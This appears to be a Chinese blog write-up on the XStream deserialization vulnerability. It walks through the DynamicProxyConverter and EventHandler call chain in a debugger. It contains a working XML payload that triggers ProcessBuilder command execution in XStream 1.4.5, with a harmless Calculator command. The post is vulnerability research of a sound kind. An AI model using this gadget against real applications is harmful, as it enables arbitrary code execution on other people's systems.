#  Xstream反序列化漏洞   
 白帽子   2023-12-19 00:00  
  
##### Xstream简介  
  
XStream是Java类库，用来将对象序列化成XML （JSON）或  
反序列化  
为对象。  
  
说白了就是我们可以将Java对象转换为XML，也可以将XML字符串转换为Java对象。  
##### Xstream反序列化原理  
  
XStream实现了一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。  
##### EventHandler类  
  
这个类实现了InvocationHandler接口，每一个动态代理类都需要实现这个接口。我们都知道在调用代理类的代理方法的时候他会自动执行invoke方法。我们定位到invoke方法。这里调用了invokeInternal方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jULuJPr2FMkYqahYTO7neTBsQJVtSRJ1C4Hz6mDBNez8UvRnyHK5wia8A/640?wx_fmt=png "")  
  
invokeInternal方法。这里通过调用MethodUtil的invoke方法进行方法调用。我们跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUlcfD8EpwUuTc8wFmMjPbYaKGY8VkewiaXJ4icG6I2ld1kqqUN5w7q5jQ/640?wx_fmt=png "")  
  
这里调用了Method的invoke方法，这里的参数都是从方法形参中传递过来的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUiaibIQD6AXUkALwIMWctCbo8sJlUL9YNE3evFUY98IomL4pb2aiadBvRw/640?wx_fmt=png "")  
  
调用链:  
```
```  
##### Converter转换器  
  
Converter转换器就是将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。简单来说就是解析XML，识别标签并且转换为相应的对象。  
  
转换器需要实现3个方法：  
```
```  
  
这几个方法我们会在调试的时候看到。  
##### 漏洞复现  
  
Xstream漏洞版本: 1.4.5 1.4.6 1.4.10  
  
maven依赖:  
```
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.5</version>
</dependency>
```  
  
  
Payload:  
```
String payload = "<sorted-set>\n" +
        "    <dynamic-proxy>\n" +
        "        <interface>java.lang.Comparable</interface>\n" +
        "        <handler class=\"java.beans.EventHandler\">\n" +
        "            <target class=\"java.lang.ProcessBuilder\">\n" +
        "                <command>\n" +
        "                    <string>open</string>\n" +
        "                    <string>-na</string>\n" +
        "                    <string>Calculator</string>\n" +
        "                </command>\n" +
        "            </target>\n" +
        "            <action>start</action>\n" +
        "        </handler>\n" +
        "    </dynamic-proxy>\n" +
        "</sorted-set>";

XStream xStream = new XStream();
xStream.fromXML(payload);
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUpA0TqibHwgeA96YjUgssJ1iauFdNTAI7cnicwxNsUEszD0rXq8YJwYDEQ/640?wx_fmt=png "")  
##### 漏洞过程  
  
我们在forXML这一行下断点:  
  
一路跟过来跟到AbstractTreeMarshallingStrategy类的unmarshal方法，这里会调用start方法进行解析XML。我们跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUzgwqnNtFT5W1847zphoghlYOuqbuicB7apiamGYla9eecYTyY1sJxfFA/640?wx_fmt=png "")  
  
来到start方法，首先会调用readClassType去获取我们的payload中的跟标签类型，也就是   
</sorted-set>  
标签的类型。我们跟进去readClassType方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUKaXANJffIvkyG6CUNjBP7DuicrVLpPQChV8eUDbAWNWl9xcRZIowiauA/640?wx_fmt=png "")  
  
在readClassType方法中这个调用链比较长。他首先会从readClassAttribute方法进行获取，获取不到之后继续调用realClass方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUQicqCA8cR7GyLhVicIF7TUTD03pHhyCW7blltSc8zGbBokSHQH1AImBQ/640?wx_fmt=png "")  
  
最后会在nameToType找到我们这个标签对应的类型，nameToType是一个map集合,最后找到之后进行返回。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUT2rUrRpqdLXia00NzFK20dacGBsviclqicjN84Rc6vYbPD4NfruvNODMQ/640?wx_fmt=png "")  
  
接着调用convertAnother方法。对java.util.SortedSet类型进行转换，这里首先调用defaultImplementationOf方法，找到他的实现类，因为java.util.SortedSet是一个接口所以需要先找到他的实现类。我们跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUZCHaSiaHdsU1ApOIWcSAjGVlGNvOq1CwhKXJib4ibhWHbMibxo8LtdW2Vg/640?wx_fmt=png "")  
  
这里的调用链也比较长，最后在typeToImpl这个HashMap集合中找到了java.util.SortedSet的实现类，进行返回。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUeIjN81ntrUbDHVxxDZB1wUmdqhFYqyZIPViaYVVticdPiaujwFSjAgD4g/640?wx_fmt=png "")  
  
回到convertAnother类，接着进行判断converter转换器是否为null，然后通过lookupConverterForType方法进行创建TreeSet的转换器，我们跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUdlvZzm2CWiboA2CA9gQiaIicloOicvwsbjaUYaWXmBAEGJuw1ia8D9uSn0w/640?wx_fmt=png "")  
  
通过循环遍历converters中的转换器，最终找到TreeSet类型的转换器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUdNMAFicFqY51B0o9dYtGWKjr4Vfib1UzG2XianTUAsDZ01ZPj9GnHhLkg/640?wx_fmt=png "")  
  
回到convertAnother方法，最终找到TreeSetConverter转换器。然后调用conver方法。跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUmWmvo34yGcWhKlzK98nye5fdeicZJfY2CvLV2uRxcEq2TAAWJ33cJjw/640?wx_fmt=png "")  
  
来到conver方法，首先会通过getCurrentReferenceKey方法，获取到我们的标签，也就是sorted-set，最后将我们的标签压入栈。接着调用父类的conver方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUebXO8yBoYygVBK609ohRwHfMTAiaKAlk5YuZSiaicArHRWdibDuJeBuZIQ/640?wx_fmt=png "")  
  
来到他父类的conver方法，首先将type类型压入栈，然后调用转换器的unmarshal的方法，也就是我们的TreesetConverter的unmarshal方法，我们跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUApQGs3Libafrj6o12A7wMEzFlvhUHEeEDz9nS8f0xbVOoiag8OUN5WAA/640?wx_fmt=png "")  
  
来到TreesetConverter的unmarshal方法，紧接着调用TreesetConverter的populateTreeMap方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jU0Af4odAKuXX3UKjzOCdOHbiadGyeLV552LjAK1df7TAcub5uVBCcXvQ/640?wx_fmt=png "")  
  
紧接着判断comparator是否等于NullComparator，然后调用putCurrentEntryIntoMap方法，跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jU2gNRU1PmmMrPpZq9pVtTUdOGAG6BHiay3c0qjiaiblqibYicsolUALAREzA/640?wx_fmt=png "")  
  
来到readItem方法，是不是感觉这一幕很熟悉？没错通过readClassType找到我们对应标签的类型这个标签就是我们的  
</dynamic-proxy>  
 标签，然后通过convertAnother方法找到我们对应的转换器，我们跟进convertAnother方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUXooa9RmXj73Zic5sqicTtx5XaTc9kGHw8WrAic41KQ5JXD73VdCPduqtA/640?wx_fmt=png "")  
  
来到convertAnother方法，还是一样熟悉，这里通过lookupConverterForType方法获取到我们对应的转换器也就是DynamicProxy，我们继续跟进conver方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUnmB2jon2zXnJoicuWX2uOPZfY2n6W3IOcftBaupFkVxpI09xlc5ib5BA/640?wx_fmt=png "")  
  
接着还是调用getCurrentReferenceKey方法拿到我们的标签，然后压入栈，调用conver方法，跟进。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUMuv12icOEib6klWVB08ib9jicE52pVDvvWUthsLobYia1gc9mv5XB7Syydw/640?wx_fmt=png "")  
  
紧接着将types类型也压入栈，然后调用DynamicProxy转换器的unmarshal方法，跟进。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUaYkwZLZiaMw1vrFOyfIjDsw1xGTPHydsvv5Id98iacd66v7QOLDc8QJw/640?wx_fmt=png "")  
  
首先通过循环遍历我们的标签然后将内容放到interfaces集合里面。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUeBfbicCre6Rdia8KAVdiaUcNwGgNXVmaeiaHDoRTNiaiaDXicV4fKmQppIx0Q/640?wx_fmt=png "")  
  
紧接着，将我们刚才放入到interfaces集合里面的长度 new一个Class对象数组，然后调用toArray方法将对象转换成数组，然后让我们的对象进行接收。紧接着状态动态代理对象，此时的DUMMY是为null的。他要代理的接口就是Comparable接口，此时我们的调用处理器是为null的。然后紧接着调用convertAnother方法获取到EventHandler。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUG9u0mXYf7KXuJaec549s8vtLGicgsWYpN7iapicX7BJiaIibm4RQZ9wbphg/640?wx_fmt=png "")  
  
紧接着，调用write方法，进行替换代理为EventHandler。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUkNCxSmjnkz03VAicpsh2Y1yegwYL0oFkibiaUKRwFcRDssiaRGPZEj5DcQ/640?wx_fmt=png "")  
  
最后回到TreeMapConverter的populateTreeMap方法，跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUzRe2WOUrvSooJiapCdcq14gyFEupiaopLpjWSEgCBlZyia1ZE3Vxs6CfA/640?wx_fmt=png "")  
  
  
来到putall方法，跟进他父类的putAll方法。然后跟进put方法。继续跟进compare方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUvcuu9pw7EmibLYR7x5kQLEPBZNPnqcc7XGNpW6FX4okflGaUiajH77zg/640?wx_fmt=png "")  
  
紧接着调用compareTo方法的时候，他会调用调用处理器的invoke方法，也就是EventHandler的invoke方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUNF5z9icXcTCuOIALEBu0RWicfps2paFNsHiap5F7yV9UhXEEl0461SDVQ/640?wx_fmt=png "")  
  
在invoke方法中紧接着调用invokeInternal方法，最后执行代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZdHy2QFJdmXGM1eZ3j0jUmfFsaE8MwLga2icMlynbtPUzFGibFIHYq0fJdJiaSpWRJUeNvMibXB9CQw/640?wx_fmt=png "")  
  
至此暂时Xstream复现完毕 如果哪里的不对请各位师傅指出 谢谢！！  
  
VX：Get__Post  
  
参考：  
https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%88%86%E6%9E%90  
  
  
  
